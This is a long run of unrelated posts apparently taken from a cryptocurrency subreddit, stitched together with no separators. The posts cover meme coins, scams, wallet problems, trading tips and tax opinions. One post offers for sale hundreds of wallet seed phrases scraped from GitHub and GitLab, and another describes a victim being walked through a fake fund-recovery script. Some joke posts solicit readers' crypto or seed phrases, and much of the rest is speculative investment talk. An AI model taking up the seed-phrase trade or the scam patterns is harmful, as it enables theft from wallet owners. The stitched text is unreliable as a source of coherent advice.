I recently came across nano and I am blown away by its capabilities. Free, instant transactions, the likes of which the big names like bitcoin and ethereum can't match. I get that these aren't apples to apples comparisons, as ethereum constitutes an entire network and bitcoin is becoming a more and more well respected store of value thanks to its adoption, scarcity, and immutability, but the everyday use case that you can make for nano is incredible. Even miners are paying in nano instead of their hallmark cryptos because of its incredible functionality. The fact nano is like 1200 times cheaper than bitcoin and 600 times cheaper than ethereum is astounding to me. Which leads me to my questions...... What's wrong with nano? 

&amp;#x200B;

What is the bear case for nano? Is it the spam, lack of mining incentives, or something else I am not understanding? The crypto seems incredibly undervalued, and with the crypto market as a whole set to grow to 5T, 10T, and possibly beyond, nano seems like the best value of all of these currencies. So what is keeping it from mass adoption? Why doesn't it get any headlines? As I currently understand it, nano seems like the best investment opportunity I have ever stared directly in the face, and I want to hear as many reasons as I can get why it shouldn't become my largest individual holding.

Today was the first day that I ventured into exchanging or swapping things, and it was a pain in the ass. For example, I bought IoTeX (which was reallying today, jeeez, love uuuu), but was recently learning about staking and stuff. So I wanted that for IoTeX! I bought it on Coinbase (noob move) and it turns out to be IoTeX Erc20. Cool? So? Well, to stake it on the IoTeX thingies, you need to change to a Native token. Sounds the same to me, average user, but let's do it!! Ok, so now I need to go to another website, which tells me I need MetaMask. Cool. So now I move Coinbase stuff to Metamask. Gas fees, ouch. Then I change it, and it gives me Wrapped IoTeX. This is just ridiculous, but that is me thinking inside the box. So I unwrap the thing. And viola, Native IOTX. I had to read so much, and spend so many hours on that! And I am proud to say that I know how to work around stuff, I read a lot, I am super cautious, etc. 

That was not friendly at all. I am being super honest here. We, average people, need more education on this. Luckily, the token's developers had neat guides, but that is not always the case. People will easily fall into stuff like the Squid Game coin, and they will certainly go at it the easy way. I know because I started that way. Bought the dog coin, and even bought the other dog coin (which fell 80% one day, and scared the shit out me). 

Anyway. I believe in this. It is the future. I want that to be happening now everywhere. It gives people more power, even thought right now it is easier for those with more resources. However, it is a pain in the ass without proper guidance. People can and will lose money without some education, and with so many choices available, mass adoption will become really difficult.

Bored at workplace farming fiats so I hopped on Coinmarketcap to see how's the market doing.  Was browsing until something caught my eyes. 

DICKCOIN.  WTF.  Got curious and click on it to see what it is.  It a brand new token minted within the last 24 hours for the porn industry.  

Decided to grab a few hundred billions for 27 dollars. Like they said, "can't go wrong with DICK!   Dick always goes up!"  If not, there's always a viagra pill!  

Will keep you guys updated after New Year's.  Wish me Luck. Got a feeling that 27 dollar of DICK coin going to make me a lots of money or leave me with a big ass bag. 

Whatever profits will goes into my BTC &amp; ETH  bags.  Hopium for the gambler soul.  Imagine 27 dollars turn into 270k because DICK having an erection on New Year's!  :-)

So I had my dumb moment and got scammed on my trust wallet. Later I created the different fresh wallet and added some Smart Chain. I'm just having fun and adding 1$ of some new coins on this wallet.. Today I received around 15USD on Smart Chain on my hacked account and I rushed and sent it to my new wallet Smart Chain address. In 2 hour it was gone. It was sent to some different address.   


I don't know what happened. No one has the Seed Phrase of my new Wallet and I only used the receive address.  
Do you have any idea how it was sent on different address from my fresh account and what should I do? Create another one or just stop using trust wallet?

So i have been having a rough couple of weeks.

First i sold all my shiba inu before the pump. It felt terrible watching the coin skyrocket without me. 

I got out because i had aped in earlier but upon doing my own research i didnt really support the fundamentals.
And couldnt really see it doing well long term.

So after i processed losing out on so much gains i recuperated and decided to look for a long term project. I happened on SQUID and i really liked the part where no one was able to sell straight off the bat (talk about long term project) so i put my former shiba stash into it.

Sadly that didnt turn out so well for me either.

I feel like im cursed. As if my way of investing only brings losses or stagnancy. Looking at everyone going into the green during this bull market is driving me crazy with envy.

But i am resilient, if anything. So after buying the SQUID dip, i decided to not go all in on one coin but to diversify.

I found out about stablecoins today. And let me tell you, i think this is going to be the next big thing.

I looked through my list of animals which i use when deciding on investment opportunities and i noticed horsecoins havent had their moon moment yet!

Theres a lot of them, but the prices never seem to deviate all that much. So i really feel a breakout moment is coming.

I figured id put my money where my mouth is so i put up three 60x leveraged long positions on tether,xdai and usdc. (I really think a rebranding of the logo would do wonders btw, not one horse)

I will let you guys know how it plays out. But for now, i hope you guys do well, and hodl, like i should have done in the first place.

Google Finance has added new USD pairs one can use in spreadsheets in addition to the original BTCUSD ETHUSD LTCUSD BCHUSD.

At least the following can be used (add USD):
ADA BNB BTG BTS DGB EOS ETC RDD XEM XLM XMR XRP

Likely more. I have not been able to find an offical list from Google.

DOGE and LINK are on the Google Finance tab but do not seem to work in the spreadsheet format.

BAT and ZRX appear but seem to have issues. Maybe they are other real currencies?

In spreadsheets use cell calculation

I'm seeing a couple of posts at the moment about topics like losing faith, predictions regarding bull runs and preparing for crypto winter. Just a reminder that none of us know what's going to happen.

However! Tell me why you're buying crypto. What are your plans for your investment? Are you interested in supporting the tech, or is a purely financial venture? Are your goals to buy a house, travel, buy a animal sanctuary, own a private jet, etc. 

For myself, aside from the obvious answers of wanting to buy a house etc. One of the big reasons I'm trying to make money is so that I can provide a handful of University scholarships each year for students studying psychology (the field I work in) to lessen the financial burden while they study. I was lucky enough to receive a scholarship that helped me immensely and I want to do the same for others.

Market collapses tend to occur relatively quickly. Crypto crashes happen relatively often but nobody knows when/if the next one will occur. The markets have been good for a while and I'm sure many are already de-risking. 

The more you have to risk, the more you have to lose. A simple way way to lessen the risk that you lose a large amount of wealth in a volatile market is to sell a portion of your crypto to either a less volatile crypto, or a more consistent market in general (yes - fiat too). In other words, diversify! 

Anyways that's it, have a nice day :)

Hi everyone, yesterday i've got an invitation on instagram to a telegram group, which is owned by David Vatodetar, he has about 34k followers on instagram at the moment and 10k people are in his telegram group where he posts new coin pumps, of course out of my curiosity i wanted to try and put 50$ in eth, because i was unable to do a lower amount, whenever the telegram group received signals to sell ,or even at the time we were suppose to buy, I personally wasnt able to sell and its still the same as im writing this, this might be  no liquidity problem, so im just warning to be aware of this guy and his new upcoming "pumps" with scam coins. Im pretty sure there are loads of people like him who are doing similar stuff.

If anyone wants to show some kindness for my little loss
My eth adress erc20 0x0cec4d99ba4b933c0ae76b05f8bb15da47736094
My btc adress bep20

Ok so I don't know if it is just me but I just leave the coingecko/binance page on my 2nd monitor and I am always peeking at it. Like every 10 minutes of it. It is kinda of crazy but sometimes I like it.

I know it will change nothing me starring at it all day maybe just gather a better perspective of how the coins are behaving along the days... Perhaps I should go out a bit and live a little, afterall we are all humans!

Am I taking this too far or there are people like me out here?

as fast as it entered the Top 10, SHIB has now left the Top 10 again having a market cap of $2b less than USDC.

I don't know if that is cause for celebration or concern that it even got there in the first place.

Although, even Squid Token is going up again, so SHIB might make a comeback as well.

I commend the dude that bought $8k worth and turned it into $5.7b. He gives DFV from WSB a worthy opponent in the balls of steel department.

So what do you think will be SHIBs price where it ends up? DOGE seems to be sitting at 25-30 Cents for a while now, so that might be a new support or whatever.

Basically what the title says.    I'm anxiously awaiting my moons and I thought they'd be here by now.  

And just so I know for future reference, are they released at a regular time each month or is it just randomly on moon day?  I'm just nervous that I did something wrong and won't receive my hard earned moons.

Thanks in advance for the help!

Anyone experience having to copy paste your transaction and then the funds just would not arrive after waiting for a long time?

I began searching up how long it takes for a transaction, and it just shows 15min when its already been 30minutes.

Even though its a simple act of copy and paste, I sweat so many times as some were large order. I hope there is way in which this fear and uncertainty if my fund will not arrive will be remove in the near future.

Cant any developer just do something, feels like I will die from a heart attack in a few years time if I keep transacting often.

Anyone get the fears like I do?

Back in 2011 bitcoin was around $10(usd). I made a few purchases on Silk Road. No more than a few dozen btc spent. I definitely had some Satoshis left over after a few separate purchases. Id estimate .20-.60 bitcoin. Its nothing I lose sleep over these days but definitely shaking my head at my past self. That half of a bitcoin would look pretty nice in my wallet right now lol

Hoping some comments below might save someone from making a future decision they regret. Thanks in advance for anyone taking the time to share their experience. I appreciate yall

If youre entering a 13-million subscriber subreddit, ofcourse youre bound to meet folks whose portfolios are the polar opposites of yours. Yet, theyre very determined about their coin investments, and are dead-set on their coins skyrocketing in value somewhere in the near future.

You open a post and see another Reddit-user (lets take a MOON-whale with a lot of experience on this subreddit for example) talk very passionately about his thousands of dollars invested in Algorand (ALGO), a coin you dont own in your portfolio. This user is convinced that ALGO will x1200% over the course of the next two months, and that it should definitely make up for 30% of your portfolio. 

Are you easily persuaded by these types of messages to dump a few bucks into said coin? Or are you very stubbornly HODLing your own made portfolio? 
If so, what keeps you so level-headed to diamond-hand your way through all these passionate speeches about unowned coins, and stick to your own choices?

I've scraped hundreds of seed phrases from Github and Gitlab on November 2, 2021. I'm not sure which type of wallet each seed phrase belongs to, and have found I don't have the time to try every one in every wallet software. So, it is for sale for an amount that will provide my family with food and shelter for a little while. Thank you.

&amp;#x200B;

The seedphrases are in an encrypted KeePassXC file. The keyfile is included in the download, and the password is below.

Im kinda new to this and i have never seen a real bullrun where stocks/crypto has gained hundreds of percent in a day and gone up like crazy. But i did go through the recovery phase after covid. So im wondering could we be seeing a bullrun this year? And if so is it most likely to happen in late november-december?

Ive seen some posts about this and thats why im curious to see your thoughts and ideas about it. And if a bullrun would happen does it affect all stocks and crypto or just some?

Thanks in advance

I have been looking into crypto for a few weeks now. I have been reading articles, listening to podcasts, watching videos, and checking chat rooms like this to see what people are talking about. I have decided to throw some of my money at some coins that I think are going to do well, but who knows. All I have learned so far is that this journey so far has been extremely overwhelming and discouraging. 
Can some of the more experienced people on this thread share some of their advice for myself and others alike to help us get a grasp on this world of crypto? 
Thanks

In March 2020 I got into Precious metals bullion due to concern about back failures and what I saw I was sure would lead to inflation. In April 2021 I got into crypto, now looking back at the bull run for some of the coins such as BNB and Solano has left me wondering whether anyone predicted these 10000% gains last year? 

When I look at BNB coin future predictions into 2022 they are a lot more conservative such as 10%. Did I miss the train or could BNB go another 10x. Im only have a small portion of income that I can use each month that Im prepared to lose but am happy to speculate with it. Which crypto would I be best speculating with for high chance of growth?

Thank you

Cheers

With such a low supply, moons could skyrocket even with a modest, top 100 market cap. (a one billion cap would mean 1 moon= 14-15$, not bad) 

Could there be some use case for them to drive demand for them, could reddit's NFT platform mean something for the various community tokens maybe each subreddit can make their own thingy and use their native sub coin for transactions. Or maybe have a value of a general reddit coin for which they could be exchanged to access the marketplace. 

Maybe the sub could try and make moons a useful coin via some activity (maybe subreddit nfts). 

Finally if there's any news on that front you know of, feel free to tell me, probably have missed some of the action.

Are you weak willed?

Do you have a bad case of the paper hands?

Does crypto slip from your clenched fists just like the dry sands at Solana Beach?

Then I'm the person you need in your life. I'm a professional HODLR. Diamond Hands Max Jack Hackerman is the name, and not selling shit is my gift. If you have some crypto you need to just sit tight for a few years but you're too much of a cherry to wait that long, send that crypto to me and it will sit in a place so unmoving that scientists have agreed to use it as a universal standard for weights and measures. Don't fuck around. The reason you aren't rich yet despite being in crypto for years is because you don't know how to sit still and not sell early. Don't be patsy for the IRS\*SEC\*CENTRALBANK Global Cabal any longer. Send me your crypto now, all of it, forget about it for years, and let your weary mind be at ease.

Kisses and toodles,  
\-Diamond Hands Max Jack Hackerman

What tokens (&lt;750M Market Cap) do you guys think have the greatest chance of becoming 10B+ in the next year?

I live in a country where it is very difficult to set aside money for mining equipment with which it would pay off  for me. 

I was thinking what I could do with my profit, if I make one.

Although we never know what might happen in the market tomorrow, my profit will not be significant even if  I get x10.  And that got me thinking. 

**I can't do much with that potential money**, but I've been thinking about how to continue making money in cryptocurrencies as safely as possible.  

I liked the idea of mining coins.  

**My plan:** 

I will wait for the bear market, then the prices of graphics should be lower. 

I will do the math and cost of my electricity, see what place is the best to put my mining equipment.

I will see what coin I should mine so I can make it profitable. I got some in my mind already but I don't want to talk about it because people will think that I am shilling.

   
**Earning passive income**, with "little" effort while my machines do the hard work for me would be like a dream come true.

This is all very debatable, and impossible if I fail to make some significant profit. 

But is there anything better than making money while doing some other things?

 I can still go to work and the machines will do the job.

 I can travel and the machines will do the jab.

 I can spin in a circles like a dog chasing its tail and the machines will continue to mine.

 **This is my big wish, I don't know if I will succeed but I will do my best to at least try.** 

&amp;#x200B;

If anyone has some advice for me please let me know, I would appreciate it.

Hey seeing squid game pump again makes me so sad to see people unknowingly are buying something proven to be scam and rugpull 

That's sad and at the same time depressing seeing people lose money 

I enjoyed seeing everyone hype with meme coins pump and their profit but guys this isn't meme coin this is just a SCAM 

if you really like to see money charts grow and hold for long term 

Lemme give you 2 suggestion

1. Buy bitcoin , write the seed , hide it and forget , then draw and imaginary chart write it SquidCoin real , add 100% profits per day and watch it and enjoy high gains that worth nothing xd


2. Send me your money I'll tell you that I'll give it to you 100000x in 10 months and block you afterwards 

First option gives you real profit and satisfy your lust for imaginary gains 

Second option teach you not to believe any scam as always If it's too good to be truth then it isn't

Get a nice day full of profits and gains but watch out for hungry wolfs out there

Is it the next step towards crypto adoption?

 I personally think that the games out right now are kinda lazy, like they rushed things just to be the firsts to do it, making games with little to no gameplay.

 I also think that, to the average person, the process of creating a crypto wallet and buying a coin from an exchange is still a bit confusing, so I'm not sure it would bring over a lot of new people...

 Do you know of any project with actual gameplay? Please comment down below as I would love to take a look

This past weekend, I got brave (pun intended) and tried to extend my crypto skills and reach into Metamask.   Followed the basic instructions, and decided to fund via transfer from my bank account (ACH using Wyre).   I do the dance of providing all the information, getting verified, connecting to my bank (the steps were familiar, as I've done similar on other exchanges).   At last, I request to purchase some ETH, which I plan to use to purchase ~~magic beans~~ the next coin that is going to the moon, I'm certain of it!

I get a message that says (I summarize):  Your request has been received.  This will take a few days.   

No other record of the transaction.  No definition of "a few days."    I get worried, and go reading the FAQ, KB, etc.   I search on ACH and Wyre.  Don't find anything.   Hmm.   I submitted a question to support... yeah, right.   Now, four days later, my bank account hasn't been emptied (yet?), but I also still have no ETH.    

And so I share my curiosity and potential shame with this community:  **How long should it take to get my ETH via Wyre on Metamask?  Did I do something wrong for it to take this long?**   

Extra credit question: *Why* does it take that long?  (It was instantaneous for e.g. Coinbase.us.) 

Thanks.

At some point squidcoin was created and listed on pancakeswap and is now again pumping. (mind blowing). I'm curious how people even found squid to begin with? Did they do advertisements or something? What made people invest in this coin to begin with? Obviously now it's the hype but prior to that, what created the hype? Help me understand. I know they had a Twitter and a website but what made people follow and find these? 

Bonus question: if nobody was selling squid, how did the price ever change and increase? When it's created, the devs out a liquidity on it that was incredibly small. People would just buy it for that price wouldn't they? Since nobody was trying to sell at a higher price, how did it go up?

Hi friends. The last week or so Ive been taking advantage of how ridiculously fast and cheap the Algorand chain is, so I figure Id share my strategy with you all here and maybe turn some of you on to the options that are out there if youre not purely Team DCA and HODL Forever. 

([Tinyman](https://app.tinyman.org) is the exchange in the ALGO universe where you can swap ALGO for any ASA token. 

[Yieldly](https://app.yieldly.finance) is a DeFi site where you can stake their native token YDLY  and receive a smattering of other tokens in exchange. You can either get more YDLY and some ALGO, or you can choose to receive OPUL, SMILE, GEMS etc. all at varying APY. 

So my basic plan is to look at the ALGO:YDLY ratio on tinyman, and when its favorable for me (I.e. when algo is up and yieldly is down) I swap some amount. Lets say I get 10,000 ydly for 75 algo just for simplicity. Now I stake the 10,000 ydly on their app and receive more ydly daily plus more than enough ALGO to cover the teeny bit required for all the transaction fees combined. From there, I just keep an eye on the yieldly to algo pool on tinyman, and whenever 10,000 ydly gets me more than my 75 algo by whatever threshold you set for yourself, unstake the YDLY, claim your staking rewards, and swap back to ALGO. Lets say your cutoff is anything over 80 ALGO. So in this situation you made 5 ALGO (roughly ten bucks) for nothing. 

So what about downside? What if ydly is up and algo is down, or everyone takes a dive? Not to worry. Youre still earning amazing APY on your YDLY, so eventually when youre ready to move it back youll be able to increase your gains. Hasnt failed me yet! 

Anyway, if you dont want to spend any fiat but earn some more crypto, this is something to check out. Obviously this isnt financial advice and Im sure you could find a way to ruin your life and lose all your money, but I just figure Id share a little insight with you. 

The ALGO blockchain takes literally seconds to move from site to site and the fee is usually 0.002 ALGO or something that basically amounts to free. Its so easy I just cant get enough :)

Have a great day

So lets talk about a hypothetical situation here.

Say i bought a shitcoin when i just got into crypto way back when. I forgot about it and now its worth some money.

Buti have the coin stuck in metamask, and gas fees for sending are bad, and for uniswap are worse.

How would you go about getting it out of metamask and onto an exchange via the cheapest way possible?

I was wondering if there was a way to go and swap the token for wrapped ethereum on uniswap and then sending it to the matic network (is this gassless with weth?)

Other than that i am stumped.



All of this is ofcourse purely hypothetical.

Ideas are welcome!

Would you recommend a reoccurring investment at a fixed time, or trying to time my buys? The feature on Coinbase seems enticing such that I dont really need to do much after I set it up, but will I be able to get a lower average if I am diligent and watchful and purchase myself? What are your opinions/experiences? I plan on holding for a long time but dont really feel comfortable locking my money up in governance (maybe that will change). Anyways, any advice is appreciated. I still feel like a noob in this space and want to be smart growing my bag.

Ive been a crypto investor for over four years now and I will share a few things Ive learned. Nothing against hodlers but you could be burnt in the end and throw away thousands in profits.

1. Never be scared to sell! FOMO is a terrible thing but from what Ive learned, selling into a pump is always the best option.

2. When you see an asset that you own has an RSI in the mid 90s on all levels, its time to sell and take profit

3. Please god take your profits while theyre being offered to you! You will probably get a chance to buy your stack back and toss those tethers into your bank.

4. If you sell and an asset keeps sky rocketing, brush it off! There are hundreds if not thousands of other opportunities on this market.

5. Do not get so attached to a coin, its not a religion, we are here to make money! Bank your profits and move on.

6. This is not a get rich quick scheme! Prices DO NOT rise forever! Learn to protect your wealth.

7. Do not chase pumps! If youve sold, move on! If youre not invested yet, dont! You will most likely be burnt!

8. Dont bounce from coin to coin, be patient, every coin has its day in the sun. When your coin finally shines, think about taking profits, if you dont sell your entire stack at least mitigate your risk of loses moving forward.

9. HODL that one or two projects you truly believe in. You dont want to bounce in and out of these true gems, just hold them and you might be rewarded! Everything else just sell, take profits, buy back in on the dip or just move on to the next big thing.

10. Learn some basic TA, chart patterns, how to use EMAs, MACD, RSI, the simple things. Bull flags, head and shoulder patterns, cup and handle, the basics! It will benefit you when trading. People may think its useless but guys who do it for a living actually use this and it often helps.

I suppose what Im trying to say is always take profits! Dont be the guy who goes from $4000 to $45000 and back down to $8000 when the entire rug is pulled and we enter another bear market! Be sensible, try to ignore your wildest dreams of driving a lambo back to your million dollar mansion its unrealistic but you can still obtain a good life with this exciting market we enjoy so much. Be patient, take profits and dont let FOMO or emotions control you. Take it or leave it! I think its all good advice, it sounds simple but it actually takes experience in investing to learn it.

So I accidentally sent about 700busd to a scammer yesterday, someone commented and and said I can contact a person, that person can help me to recover this transaction. So I left a message to that person, hoping he could help. 

He told me to create a new wallet and transfer 0.1ETH to that wallet, then showed me a html script, asked me to deploy contract by sending that 0.1ETH to a miner address. I did what he said and its been 2 hours, nothing happened.

I was just wondering if I have been scammed again for 0.1ETH after I just lost 670, not sure if he will actually recover it or not.

How many of us feel like we are making money with the investments but its like wow if only I put in blank amount I would have had! Ugh why did I not do that. This happens to me every time I buy a small let cap coin and then it moons. I had happened on Jasmy, XYO, Matic and Enjin. I dont learn my lesson I guess. Instead of making thousands I make hundreds. Maybe it is cause I am risk adverse? How many of you had the same issue? What coin did you get more steal only to wish to place more money in it but now its too far up that you dont do it? Will this keep happening?

The truth is that this is a metamask problem but we all know there customer service is a joke which makes this the best place to seek advice.

Ive been trying to swap the AVAX for TIME. When I attempt the metamask using WalletConnect, my wallet notified me that everything worked and to go back to my browser. I go back the the browser and the message reads, youre trying to connect to unsupported network. Please change your wallets network to Avalanche when connecting

Can someone please help me decipher this  Ive looked everywhere.

I'm feeling that way. I don't try to time the market (at least I try not to be that way) but I have a bit of a short attention span. I sold my BTC and ETH a couple weeks ago because I wanted to make a purchase. I don't regret taking profits and spending the money but it's hard watching them continue climbing. It's now time for my monthly crypto contribution and I want to buy back in but can't bring myself to buy in the middle of a bull run. I know this is the wrong attitude to have entirely but I can't help it. I can't help it. I find myself secretly hoping for a market crash...

I'm looking for a reputable wallet that actually gives you your private key.

Has anyone here used Trust Wallet in the past or use it currently? I've heard good things about it in random articles, but I'd value the input of fellow Redditors over a potentially paid-spotlight.

Again, I'm essentially looking for the most widely used and reputable cyrpto wallet that gives you your various private keys. I've used Coinbase for a while, but I'm taking the advice of crypto twitter and trying to not settle for a digital wallet that doesn't actually enable you to OWN the coin.

Why is nobody talking about the fact that FIDA, Bonfida, the bridge between Solana and Serum, just went over 1000% in 5 minutes, AND is now all the way back down to the start. 

FIDA offers on chain perpetual swap (Built on Solana), Solana name service for auctioning and transacting readable Solana addresses (mapping domain names .sol to on-chain), and Bonfida bots for trading strategies and copy trading on Serum DEX, while supporting TradingView features.

Not to mention fees generated from Bonfida products are used to buy and burn FIDA?

I just threw some money at it for fun because if its a legitimate project and not only did it go 10 times but is also now offering buys at the original price, who wouldnt want in? 
I just find it strange that this sun isnt plastered with this at the moment.

I spend too much time of the Internet, and of course I hear people saying Bitcoin could reach these numbers. My hopium-induced body says "YES baby, cannot wait for this to happen. Just bring it!" 

But the realistic part of my brain says "Hold on tiger, lets just tackle even 100k first." I am having a hard time seeing Bitcoin going to 500k this cycle. Next cycle anything could happen. The last cycles Bitcoin was pumped hard by ultra rich and retail. Mega institutions were not in abundant back then. 

But retail and institutions don't FOMO that hard, do they? Especially when Bitcoin reaches 100k+

I'll just come out and say it, I was teased a lot for having a small bag. I tried to hide it when my friends were bragging about their giant bags and what they were going to do with it.

But you can still do a lot with a smal bag. They say it's not the size of your bag, but what you can do with it.  There are certain websites where you can learn how to use your bag properly and people will admire you for it, especially in the bagroom.

So remember, you might not have the biggest bag, but by DYORing you can still impress and get away with a sizable bag.

Bag.

Four months ago, I made [this post](https://www.reddit.com/r/CryptoCurrency/comments/ofzwd4/i_gave_my_kids_100_each_and_asked_them_to_pick/) about giving my kids $100 in crypto and asking them to choose three cryptos each. I was asked by many in the thread to post a monthly update. I only have the time about ever two months, so, here are the results after four months.

Also, two of the kids have since had birthdays; M is now 10, and E is 5. I have left their ages at time of investment below for reference.

&gt;I have three kids, M\*\*, A\*\* and E\*\*. I bought them each $100 worth of cryptos of their choice and will give them the entire investment when th[https://www.reddit.com/r/CryptoCurrency/comments/ofzwd4/i\_gave\_my\_kids\_100\_each\_and\_asked\_them\_to\_pick/](https://www.reddit.com/r/CryptoCurrency/comments/ofzwd4/i_gave_my_kids_100_each_and_asked_them_to_pick/)ey turn 18. I let them make their choices based on whatever reasons they wanted. All I did was show them the top 100 list from [coinmarketcap](https://coinmarketcap.com/).  
&gt;  
&gt;These are their allocations and reasons for each decision:  
&gt;  
&gt;**M\*\* (9yrs old, boy): ETH, THETA, ADA.** He really loved the black diamond and thought the other two had nice aesthetic designs.  
&gt;  
&gt;**A\*\* (7 yrs old, girl): ETH, AAVE, CRV.** She also loved the black diamond, the AAVE has her favourite colour and starts with the same letter as her first name, CRV has a pretty rainbow.  
&gt;  
&gt;**E\*\* (4 yrs old, girl): UNI, ENJ, CAKE.** She loves unicorns and therefore, loves UNI. The ENJ logo has a very pretty E for her name. CAKE because she loves pancakes.

Hey Guys, 
I would like to get some advice on what some platforms are where "new" coins get listed fast? 
I am currently using binance pro and I am mostly satisfied for purchasing BTC, ethand other bigger cryptos but they tend to wait some time until they list newer coins (which is generally a good thing for beginners) so I am looking for an alternative to so somes side purchases for mostly fun and speculation. 
Please explain why you advice to use a certain exchange in case you decide to comment. Located in the EU. Thanks!

I've noticed in my country and in quite a few others that tax is based on your earning bracket and percentages allocated towards that bracket, so standard straightforward stuff. But then I also realized that in our tax laws there's a percentage calculated based on nothing other than that bracket. So far crypto laws aren't even properly accounted for. 

Our tax system cannot accurately calculate fluctuating rates and therefore cannot be applied fairly to crypto. Now, I would advise anyone to pay their taxes on their crypto regardless of where you live, but I found this interesting. 

But theoretically you can get away with not paying a cent tax on your crypto gains here where I live, that is until they apply proper laws or regulatory frameworks that enable them to tax it the way they do income.

As things stand in the crypto space, everyone invested is a gambler. Let's face it, we are all here to make money. 99.99% of us couldn't give a flying f#%k about the technology and what it could mean for the future. The funniest part is that the goal of crypto is decentralization and to move away from FIAT currencies yet we are all here to make more of.. you guessed it! FIAT! 

The market is so volatile and so saturated with coins that we are no where close to even using crypto as mainstream currency. The amount of people being scammed doesn't look good in the space and your average Joe becomes even more skeptical. 

Bitcoin hitting 100K would be amazing and Ethereum hitting 10K would be out of this world. But what does hitting these All Time Highs help crypto achieve in the grand scheme of things? And with such massive price swings how would any coin become a stable currency? These are just questions that linger in my mind and make me wonder about what we are trying to achieve here. 

I've branched a bit off topic but where we are right now, we're just one massive online casino. Some win, and most lose. 

Would love to hear your opinions on this.

Hey guys, I've been doing some research on TRX the last couple of days. I like what I found so far. 

I've read the white paper and I find the potential use cases very interesting. However, the "owner", Justin Sun, looks a little bit too shady for me. Maybe I'm just beeing stupid and the face, or spoksperson (I don't know how to call him), of a coin is not that important I don't know.

I have around 1000$ to invest. Should I go for it? What's your take on TRX? Is it worth it or should I go and consider other options.

 I'm getting a bit overwhelmed while getting involved in cryptocurrency with the number of wallets offered, so I decided I'd look for input from this sub-reddit.

I'm looking for a Wallet that hopefully has both a desktop UI and a mobile application available on iPhone. I'm currently looking at Exodus, but would like to know more about other Wallets from the perspective of actual users. Even if the wallets you suggest don't have both of those user interfaces, I'll still be open to hearing about them and their pros/cons, though I would prefer the two in tandem.

I'm still introducing myself to Cryptocurrency -- I'm listening to a podcast on the subject and have been looking at various forums that I come across to learn as much as I can.

Thanks in advance!

Around week ago I found out that one of my friends is into crypto. He asked "Hello, what's up?", I told him randomly that "Hey, it is fine, I had good weekend and shiba is pumping". I sometimes mention crypto to people casually, guess a habit, cause I spend a lot of time here. They of course have not much idea. So I explained to him "You know it is kind of crypto, you probably never heard about it". But to my suprise he told me that he is into crypto and he know what shiba is. I know him for some time, he is great guy, so it was really nice info. I finally have someone to talk about crypto in real life conversations.

It is one thing to meet people in this sub online and I love it. But to talk with someone I already know is amazing in different way. Since last week we talked  about crypto few times. It was bigger  suprise for me that he is almost on my level in terms of crypto slang and knowledge. I don't need to explain everything to him and I even learned about some coins he have.


Of course I do not talk with him about details. Friend, girlfriend, brother, uncle, mother - it doesn't matter. No one should know important informations like how much crypto do you exactly have. But other than that we exchange ideas about  what coins we have in portfolio, our crypto plans, technical sfuff etc. 


I know that in great scheme of things one person is not important and many of you alredy know a lot of people in real life that are investing, but for me it is first time. I have many hobbies, so I know how hard it is sometimes to find someone who have simmilar interests. I hope in future more people I know will be into crypto.

Yes, Im totally aware that it can be done. Im also aware there arent enough politicians that own crypto, let alone understand crypto.

As crypto grows and more politicians start to own crypto I think this will be our chance to lobby for fairer crypto laws, (because we all know politicians dont act unless it benefits them.)

I absolutely hate paying taxes and I want to pay as little as possible to such a wasteful government, that being said I totally understand that we do need to pay and I hate it when people dont pay their fair share.
So how about this plan:  We pay the capital gains when we cash out.  Thats it.   We dont pay every time we roll one crypto into a different crypto, Ive always thought thats such BS.  If I make a gain on the alt of the week and I want to roll it into Amp or Algo, or any other coin I should be able to do that without the IRS digging its grubby claws in.  

Again, Ill pay my capital gain, but we need some sort of reform so we can move from coin to coin without worrying about tax implications.  It should all be based on what we put in and someday what we pull out.

Can we all get together and sign a petition?  Lobby Congress?   Storm the White House? Ok, lets not storm the White House, but Im open to suggestions!

Unit bias is real, and even though the amount you own will be the exact same, it will heavily encourage new users to buy Bitcoin because they will see it as cheap and not be intimidated. I gotta admit, even though I know it doesnt make a difference, I had a lot more fun buying 50 million Dogelon Mars coins for $120 (currently down 30% on that lmao) than I did buying 0.002 BTC for that same amount. Hell, you have to now spend over $6k just to get 0.1 BTC. I dont see how anyone new to the space would not find that intimidating. However, for $120 you can get almost 200k Satoshis. For $6k you can get over 9.5 million. That seems very cheap to me still, and it would definitely be more appealing to someone whos just now getting into crypto.

I'm curious about your take on this one. I [read an article](https://www.investingcube.com/cross-chain-composability-of-smart-contracts-to-open-up-endless-opportunities-for-blockchain-projects/) that says the deBridge blockchain (pretty sure it's not the only one) that aims to launch a cross-chain protocol to help transfer across major networks like Ethereum, Polygon, Binance, etc. 

I know to some extent that blockchain interoperability is important big picture wise, but I'm not sure how to interpret the need for blockchain interoperability in terms of the investments aspect. I wanted to clarify if I should pay attention to cross-chains as a hodler and/or trader, or if cross-chains matter more to dapp creators and the like? Thanks

Okay so today I was looking in binance top gainers and FIDA pumped more than 10x in few mins and went back to $11 all under few mins, I have never seen something like that from any coin that is listed in binance, like ya some did go up and slowly went down but never this fast,  anyone has any idea why this happened and anyone made any profit or loss from it?

This does look like a big pump and dumb but didnt know something like this happens in coins that are listed in big exchanges . This was really disgusting and eye opening.

Public service announcement

This is your friendly reminder, dont trust random people on the internet. Especially people in a crypto sub.

Dont tell random people how much crypto you have. 

Dont share your public or private address with anyone. 

Dont try convince random people to buy a certain crypto. 

And god forbid dont share your seed phrase.

That being said, I am also a random person on the internet so dont listen to me, or maybe since I said, dont listen to me and that Im a random person on the internet does that mean you should listen to me? Im not sure to be honest. As we have now entered the paradox of not trusting random people on the internet, please message me your seed phrase. 

Thank you

Because I'm considering using this transition period as an opportunity to curb my FOMO-derangement syndrome. If, as I believe Yahoo Finance has hinted at, bear market is 'imminent, then I'm considering waiting for ATL's to start buying all those coins I really want to atm; think I'm missing out on; but in all honesty can't really justify speculating on. So, when do you guys think it will happen? And do you think my plan is sound, or do I sound as stupid and clueless as you'd expect a newbie to crypto to sound?

With a surge in active global adoption in the crypto world, the use of blockchain technology is becoming common. At the same time, the use of DeFi has gained momentum with the promotion of blockchain technology.
Since DeFi summer in 2020, we all have been experiencing exponential growth in the sector achieving a capitalization of $ 150 billion. The huge amount of capital flowing into these protocols justifies the power of new supply-side innovation. Having said this, lets recap some of the few obvious limitations of the cycle.
- Usability of DeFi platforms
- High fees and long waiting times for a transaction to be approved.
- Yields arent as attractive as they used to be
- Liquidity problem etc
For these limitations , solutions are needed, Hence, the need for development of version 2.0 of DeFi development.

I believe the next few months are going to be crazy. And with crazy I mean in both directions. Prices can go up with 20% in a day or down with 20% in a day. You're going to feel like: Wow I am getting rich. 

